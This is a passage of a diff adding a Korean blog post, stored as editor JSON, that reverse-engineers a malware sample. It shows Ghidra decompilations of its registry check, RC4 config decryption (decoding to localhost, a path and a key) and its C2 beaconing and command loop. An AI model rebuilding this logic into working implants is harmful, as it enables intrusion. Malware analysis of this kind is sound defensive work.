+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "bool FUN_00402d30(void)\n\n{\n  LONG LVar1;\n  HKEY local_8;\n  \n  local_8 = (HKEY)0x0;\n  LVar1 = RegOpenKeyExW((HKEY)&hKey_80000002,L\"SOFTWARE\\\\MOTHRA\",0,0x20019,&local_8);\n  if (LVar1 == 0) {\n    RegCloseKey(local_8);\n  }\n  return LVar1 == 0;\n}"
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "5. CONFIG 가져오기"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FUN_00402cb0(힙 할당)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "멀웨어의 config"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "멀웨어에서 중요한 정보로 통신처나 암호화 키 등의 설정정보이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "주로 데이터 영역에 암호화되어 있으며 실행시에 복호화 되어 config의 코드를 사용한다."
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "통신처(도메인명/ip주소)"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "포트"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "경로"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "복화키"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "id"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "뮤텍스"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "슬립 시간"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void * FUN_00402cb0(void)\n\n{\n  void *_Dst;\n  \n  _Dst = (void *)Heapoallocation(0x146);\n  if (_Dst != (void *)0x0) {\n    FID_conflict:_memcpy(_Dst,s_^_~_s_6_Z_7v_N_q'b_kC_y=n_)_I_k_x_00416008,0x146);\n    FUN_004016d0(0x416000,4,(int)_Dst,0x146);\n  }\n  return _Dst;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "LPVOID",
+            "marks": [
+              {
+                "type": "bold"
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": "는 Windows API(WinAPI) 프로그래밍에서 사용되는 데이터 타입으로, **\"Long Pointer to Void\"**의 약자입니다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "C/C++ 표준 문법인 **void* (보이드 포인터)**와 "
+          },
+          {
+            "type": "text",
+            "text": "완전히 동일",
+            "marks": [
+              {
+                "type": "bold"
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": "한 의미를 가집니다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "0970d45d-c658-54ef-8de2-7f6a5d23fc22",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/0970d45d-c658-54ef-8de2-7f6a5d23fc22.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "8d9e1bb3-d799-5006-97b6-c2440d29bf98",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/8d9e1bb3-d799-5006-97b6-c2440d29bf98.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "hardBreak"
+          },
+          {
+            "type": "hardBreak"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void __cdecl Heapoallocation(SIZE_T param_1)\n\n{\n  HANDLE hHeap;\n  DWORD dwFlags;\n  \n  dwFlags = 8;\n  hHeap = GetProcessHeap();\n  HeapAlloc(hHeap,dwFlags,param_1);\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "https://learn.microsoft.com/ko-kr/windows/win32/api/heapapi/nf-heapapi-heapalloc",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://learn.microsoft.com/ko-kr/windows/win32/api/heapapi/nf-heapapi-heapalloc"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "linkPreview",
+        "attrs": {
+          "id": "1976b154-fe0c-54ad-8787-b3021efb4dcc",
+          "href": "https://learn.microsoft.com/ko-kr/windows/win32/api/heapapi/nf-heapapi-heapalloc",
+          "title": "HeapAlloc 함수(heapapi.h) - Win32 apps",
+          "description": "힙에서 메모리 블록을 할당합니다. 할당된 메모리는 움직일 수 없습니다.",
+          "image": "https://yt010108.github.io/assets/imported/tistory/442161d0a89ddd202a5849002cc18d5b57bd56ee9ac99a5fb5e9286b23f4d216.png",
+          "imageKind": "image",
+          "state": "ready"
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FUN_004016d0(RC4)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "rc4를 테이블을 만들고 실행하는 함수 레퍼이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void __cdecl FUN_004016d0(int param_1,uint param_2,int param_3,uint param_4)\n\n{\n  undefined1 local_108 [260];\n  \n  FUN_004014f0((int)local_108,param_1,param_2);\n  FUN_004015d0((int)local_108,param_3,param_4);\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "RC4"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "RC4는 스트림 암호(Stream Cipher) 방식으로, 평문과 암호화 키(Keystream)를 1바이트씩 XOR 연산하여 암호화하거나 복호화합니다. 대칭 키 알고리즘이므로 암호화와 복호화 로직이 동일합니다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "RC4는 크게 두 단계로 나뉩니다."
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "attrs": {
+          "start": 1
+        },
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "KSA (Key Scheduling Algorithm): 입력받은 키를 사용하여 0부터 255까지의 값을 가진 S-Box(State Box) 배열을 섞는 초기화 단계"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "PRGA (Pseudo-Random Generation Algorithm): 섞인 S-Box를 이용해 랜덤한 키 스트림을 생성하고 데이터와 XOR 하는 단계"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FUN_004014f0(RC4 테이블 생성)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "RC4 테이블을 만든다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void __cdecl FUN_004014f0(int param_1,int param_2,uint param_3)\n\n{\n  undefined1 uVar1;\n  undefined4 local_c;\n  undefined1 local_6;\n  undefined1 local_5;\n  \n  local_5 = 0;\n  local_6 = 0;\n  *(undefined1 *)(param_1 + 0x100) = 0;\n  *(undefined1 *)(param_1 + 0x101) = 0;\n  for (local_c = 0; local_c < 0x100; local_c = local_c + 1) {\n    *(undefined1 *)(param_1 + local_c) = (undefined1)local_c;\n  }\n  for (local_c = 0; local_c < 0x100; local_c = local_c + 1) {\n    local_6 = *(char *)(param_2 + (uint)local_5) + *(char *)(param_1 + local_c) + local_6;\n    uVar1 = *(undefined1 *)(param_1 + local_c);\n    *(undefined1 *)(param_1 + local_c) = *(undefined1 *)(param_1 + (uint)local_6);\n    *(undefined1 *)(param_1 + (uint)local_6) = uVar1;\n    local_5 = local_5 + 1;\n    if (local_5 == param_3) {\n      local_5 = 0;\n    }\n  }\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FUN_004015d0(RC4 복호화)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "RC4를 복호화하는 함수이다. RC4는 XOR 때문에 복호화와 암호화 알고리즘이 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "python"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "void __cdecl FUN_004015d0(astruct_1 *param_1,int enc_data,uint enc_data_size)\n\n{\n  char cVar1;\n  uint i;\n  byte local_6;\n  byte local_5;\n  \n  local_5 = param_1->x;\n  local_6 = param_1->y;\n  for (i = 0; i < enc_data_size; i = i + 1) {\n    local_5 = local_5 + 1;\n    local_6 = param_1->table[local_5] + local_6;\n    cVar1 = param_1->table[local_5];\n    param_1->table[local_5] = param_1->table[local_6];\n    param_1->table[local_6] = cVar1;\n    *(byte *)(enc_data + i) =\n         *(byte *)(enc_data + i) ^\n         param_1->table\n         [(uint)(byte)param_1->table[local_5] + (uint)(byte)param_1->table[local_6] & 0xff];\n  }\n  param_1->x = local_5;\n  param_1->y = local_6;\n  return;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "기드라 파이썬 스크립트로 RC4복호화하면 아래처럼 나온다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "406f19d8-a5a7-588f-8f08-f3df3ac8df2c",
+          "src": "/assets/uploads/ccb0b34b-561b-5d3b-b941-5c59f394191e/406f19d8-a5a7-588f-8f08-f3df3ac8df2c.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "b'l\\x00o\\x00c\\x00a\\x00l\\x00h\\x00o\\x00s\\x00t\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00P\\x00/\\x00D\\x00e\\x00f\\x00a\\x00u\\x00l\\x00t\\x00.\\x00a\\x00s\\x00p\\x00x\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0054060915f01dc76690b937737a355a21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1e\\x00\\x00\\x00'\nb'l\\x00o\\x00c\\x00a\\x00l\\x00h\\x00o\\x00s\\x00t\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00P\\x00/\\x00D\\x00e\\x00f\\x00a\\x00u\\x00l\\x00t\\x00.\\x00a\\x00s\\x00p\\x00x\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0054060915f01dc76690b937737a355a21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1e\\x00\\x00\\x00'"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6. 커멘드 요청"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FUN_00402c10(커맨드 받아오기)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "C2 서버와 연결을 맺은 후 무한 루프를 돌며 명령을 대기한다. 명령을 수신하면 해당 기능을 수행하고, 지정된 시간만큼 Sleep 하여 보안 장비의 탐지를 피하는 비콘(Beacon) 통신을 수행한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "/* WARNING: Removing unreachable block (ram,0x00402c90) */\n\nundefined4 __cdecl FUN_00402c10(int *param_1)\n\n{\n  int iVar1;\n  uint local_1c [3];\n  astruct_2 *local_10;\n  undefined4 local_c;\n  uint *local_8;\n  \n  local_c = 0;\n  local_1c[0] = 0;\n  local_1c[1] = 0;\n  local_1c[2] = 0;\n  local_10 = (astruct_2 *)param_1;\n  iVar1 = init_connection(local_1c);\n  if (iVar1 == 0) {\n    return 1;\n  }\n  do {\n    iVar1 = get_command(local_1c,(int *)&local_8);\n    if (iVar1 != 0) {\n      FUN_00402850(local_1c,local_8);\n      FUN_004011b0(local_8);\n    }\n    Sleep(local_10->sleep_sec * 1000);\n  } while( true );\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "init_connection"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "고유 클라이언트 ID를 생성하고 C2 서버와의 연결을 수립하는 함수이다. WinHttp API를 사용해 세션을 열고, 연결에 성공하면 이후 통신에서 사용할 핸들을 저장한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "undefined4 __cdecl init_connection(uint *param_1)\n\n{\n  LPCWSTR pswzServerName;\n  uint uVar1;\n  HINTERNET h_internet;\n  undefined4 uVar2;\n  \n  pswzServerName = (LPCWSTR)param_1[3];\n  uVar1 = calc_client_id();\n  *param_1 = uVar1;\n  h_internet = WinHttpOpen((LPCWSTR)0x0,4,(LPCWSTR)0x0,(LPCWSTR)0x0,0);\n  param_1[1] = (uint)h_internet;\n  if (param_1[1] == 0) {\n    uVar2 = 0;\n  }\n  else {\n    h_internet = WinHttpConnect((HINTERNET)param_1[1],pswzServerName,pswzServerName[0x40],0);\n    param_1[2] = (uint)h_internet;\n    if (param_1[2] == 0) {\n      WinHttpCloseHandle((HINTERNET)param_1[1]);\n      uVar2 = 0;\n    }\n    else {\n      uVar2 = 1;\n    }\n  }\n  return uVar2;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "get_command"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "서버에 명령 요청 패킷(Opcode 0xaa1)을 보내고 응답을 받아오는 함수이다. 서버로부터 수신된 데이터가 있다면 내장된 키를 이용해 RC4 알고리즘으로 복호화한 뒤, 수행할 명령어를 추출한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "undefined4 __cdecl get_command(undefined4 *param_1,int *param_2)\n\n{\n  int iVar1;\n  uint uVar2;\n  undefined4 local_14;\n  int local_10;\n  int local_c;\n  uint local_8;\n  \n  local_c = param_1[3];\n  local_14 = 0;\n  iVar1 = communicate_c2(param_1,0xaa1,(void *)0x0,0,&local_10,&local_8);\n  if ((iVar1 != 0) && (local_8 != 0)) {\n    iVar1 = local_10;\n    uVar2 = lstrlenA((LPCSTR)(local_c + 0x102));\n    do_rc4(local_c + 0x102,uVar2,iVar1,local_8);\n    *param_2 = local_10;\n    local_14 = 1;\n  }\n  return local_14;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "Communicate_c2"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "실제 HTTP POST 요청을 생성하여 데이터를 주고받는 핵심 네트워크 루틴이다. 전송할 데이터 앞단에 식별용 헤더를 붙인 뒤, RC4 알고리즘을 통해 패킷 전체를 암호화하여 전송하고 서버의 응답을 수신한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "int __cdecl\ncommunicate_c2(undefined4 *param_1,undefined4 param_2,void *param_3,size_t param_4,int *param_5,\n              SIZE_T *param_6)\n\n{\n  HINTERNET hRequest;\n  SIZE_T dwOptionalLength;\n  undefined4 *lpOptional;\n  uint uVar1;\n  int iVar2;\n  undefined4 *puVar3;\n  SIZE_T SVar4;\n  \n  iVar2 = param_1[3];\n  hRequest = WinHttpOpenRequest((HINTERNET)param_1[2],L\"POST\",(LPCWSTR)(iVar2 + 0x82),(LPCWSTR)0x0,\n                                (LPCWSTR)0x0,(LPCWSTR *)0x0,0);\n  WinHttpAddRequestHeaders\n            (hRequest,\n             L\"Content-type: application/x-www-form-urlencoded\\r\\nConnection: keep-alive\\r\\nAccept: */*\\r\\n\"\n             ,0xffffffff,0x20000000);\n  dwOptionalLength = param_4 + 0xc;\n  lpOptional = Heapoallocation(dwOptionalLength);\n  if (lpOptional == (undefined4 *)0x0) {\n    WinHttpCloseHandle(hRequest);\n    iVar2 = 0;\n  }\n  else {\n    *lpOptional = *param_1;\n    lpOptional[1] = param_2;\n    lpOptional[2] = param_4;\n    if (param_4 != 0) {\n      FID_conflict:_memcpy(lpOptional + 3,param_3,param_4);\n    }\n    puVar3 = lpOptional;\n    SVar4 = dwOptionalLength;\n    uVar1 = lstrlenA((LPCSTR)(iVar2 + 0x102));\n    do_rc4(iVar2 + 0x102,uVar1,(int)puVar3,SVar4);\n    WinHttpSendRequest(hRequest,(LPCWSTR)0x0,0,lpOptional,dwOptionalLength,dwOptionalLength,0);\n    FUN_004011b0(lpOptional);\n    iVar2 = read_response(hRequest,param_5,param_6);\n    WinHttpCloseHandle(hRequest);\n  }\n  return iVar2;\n}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "7. Config 파싱해서 Decode"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "위의 함수들에서 아래에 들어갈 위치를 파씽해보면 아래 코드가 무엇을 의미하는 지 알 수 있다. 하지만 여기서 주의할 점이 디코딩 방법이 유니코드와 아스키코드로 나뉜다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "b'l\\x00o\\x00c\\x00a\\x00l\\x00h\\x00o\\x00s\\x00t\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00P\\x00/\\x00D\\x00e\\x00f\\x00a\\x00u\\x00l\\x00t\\x00.\\x00a\\x00s\\x00p\\x00x\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0054060915f01dc76690b937737a355a21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1e\\x00\\x00\\x00'\nb'l\\x00o\\x00c\\x00a\\x00l\\x00h\\x00o\\x00s\\x00t\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00P\\x00/\\x00D\\x00e\\x00f\\x00a\\x00u\\x00l\\x00t\\x00.\\x00a\\x00s\\x00p\\x00x\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0054060915f01dc76690b937737a355a21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1e\\x00\\x00\\x00'"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "1. hostname이 유니코드인 이유: Windows 인터넷 API"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "악성코드가 C2 주소로 연결하기 위해 InternetConnectW나 HttpOpenRequestW 같은 Windows API를 사용한다면, 이 함수들은 인자로 유니코드(Wide String)를 요구한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "2. rc4key가 일반 문자(ASCII)인 이유: 통신 및 암호화 라이브러리 표준"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "반면 암호화 키인 rc4key가 ASCII로 저장된다."
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "HTTP 헤더와 데이터",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
